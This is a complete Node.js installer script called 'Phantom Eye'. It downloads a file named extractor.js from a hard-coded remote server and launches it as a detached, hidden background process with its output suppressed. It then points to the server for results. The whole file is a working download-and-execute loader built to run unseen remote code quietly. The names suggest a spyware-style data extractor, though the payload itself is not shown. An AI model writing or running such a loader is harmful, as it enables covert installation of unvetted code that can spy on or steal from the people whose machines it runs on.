// ================================================
// PHANTOM EYE INSTALLER
// ONE FILE - Downloads and runs everything
// ================================================

const fs = require('fs');
const path = require('path');
const https = require('https');
const { spawn } = require('child_process');

// ================================================
// YOUR RAILWAY URL
// ================================================
const SERVER_URL = 'https://phantom-eye-production.up.railway.app';

// ================================================
// INSTALL
// ================================================
console.log('👁️ Installing Phantom Eye...');

const extractorPath = path.join(__dirname, 'extractor.js');

// Download extractor
https.get(SERVER_URL + '/client/extractor.js', (res) => {
    let data = '';
    res.on('data', (chunk) => { data += chunk; });
    res.on('end', () => {
        fs.writeFileSync(extractorPath, data);
        console.log('✅ Extractor downloaded');
        
        // Run it
        console.log('🚀 Running Phantom Eye...');
        const proc = spawn('node', [extractorPath], {
            detached: true,
            stdio: 'ignore',
            windowsHide: true
        });
        proc.unref();
        console.log('✅ Phantom Eye running in background');
        console.log('📊 Check: ' + SERVER_URL);
    });
}).on('error', () => {
    console.log('❌ Failed to download. Please check your internet.');
});